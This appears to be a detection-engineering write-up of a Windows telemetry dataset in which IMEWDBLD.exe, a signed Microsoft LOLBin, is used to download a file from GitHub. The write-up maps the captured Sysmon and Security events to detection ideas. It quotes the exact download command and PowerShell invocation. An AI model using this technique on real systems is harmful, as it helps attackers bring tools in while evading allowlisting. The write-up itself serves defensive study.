# T1105-17: Ingress Tool Transfer — Download a file with IMEWDBLD.exe

## Technique Context

T1105 (Ingress Tool Transfer) involves adversaries transferring tools or files from an external system into a compromised environment. IMEWDBLD.exe is a lesser-known living-off-the-land binary (LOLBin) — Microsoft's IME Open Extended Dictionary Module — that attackers abuse for file downloads due to its legitimate ability to fetch content from URLs. This technique is particularly valuable to attackers because it uses a signed Microsoft binary, potentially bypassing application whitelisting and appearing legitimate in process monitoring. The detection community focuses on unusual network activity from system binaries, command-line arguments containing URLs, and file creation patterns that don't align with legitimate IME functionality.

## What This Dataset Contains

The dataset captures the complete execution chain of IMEWDBLD.exe being used to download a file from GitHub. Security 4688 events show the PowerShell command line that invokes IMEWDBLD.exe: `"C:\Windows\System32\IME\SHARED\IMEWDBLD.exe" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml`. Sysmon EID 1 events capture the process creation with RuleName `technique_id=T1027,technique_name=Obfuscated Files or Information`, indicating the sysmon-modular configuration recognizes this as suspicious activity.

The network activity is well-documented through Sysmon EID 22 DNS query events showing the resolution of `raw.githubusercontent.com` to multiple IPv4 addresses. Sysmon EID 7 events show IMEWDBLD.exe loading `urlmon.dll`, the Windows URL moniker library responsible for handling HTTP downloads. Most importantly, Sysmon EID 11 captures the file creation event showing the downloaded content written to `C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\IE\T1105[1].yaml` with RuleName `technique_id=T1574.010,technique_name=Services File Permissions Weakness`.

PowerShell script block logging (EID 4104) captures the actual script content: `{$imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe" & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml}`, providing the complete attack vector.

## What This Dataset Does Not Contain

The dataset lacks Sysmon EID 3 (NetworkConnect) events that would show the actual outbound HTTP connection details, likely due to the sysmon-modular configuration filtering these events. There are no Windows Firewall logs showing the network traffic. The dataset doesn't contain any Windows Defender blocking events or AMSI (Anti-Malware Scan Interface) telemetry, suggesting the download completed successfully without endpoint protection intervention.

Notably absent are any Sysmon ProcessCreate events for cmd.exe processes that show exit code 0x1 in Security events, indicating failed command executions that don't appear in the Sysmon data due to include-mode filtering.

## Assessment

This dataset provides excellent telemetry for detecting IMEWDBLD.exe abuse. The combination of process creation with suspicious command-line arguments, DNS resolution, library loading patterns, and file creation events creates a comprehensive detection opportunity. The PowerShell script block logging adds crucial context about the attack methodology. However, the lack of network connection details limits visibility into the full network communication, which would be valuable for network-based detection and incident response.

The presence of multiple Sysmon rule matches (T1027 for the IMEWDBLD process, T1574.010 for the file creation) demonstrates that modern detection rules can identify this technique effectively when properly configured.

## Detection Opportunities Present in This Data

1. **LOLBin Command Line Detection**: Security EID 4688 and Sysmon EID 1 events showing IMEWDBLD.exe with URL arguments in the command line
2. **Suspicious Process Chain**: PowerShell spawning IMEWDBLD.exe with network-related arguments
3. **DNS Query Correlation**: Sysmon EID 22 showing IMEWDBLD.exe resolving external domains, particularly raw.githubusercontent.com
4. **Library Loading Patterns**: Sysmon EID 7 showing IMEWDBLD.exe loading urlmon.dll, indicating network download capability usage
5. **File Creation in User Profile**: Sysmon EID 11 events showing IMEWDBLD.exe creating files in INetCache directories
6. **PowerShell Script Block Analysis**: EID 4104 events containing environment variable concatenation with system binary paths and URL parameters
7. **Process Access Monitoring**: Sysmon EID 10 showing PowerShell accessing IMEWDBLD.exe process, indicating programmatic control
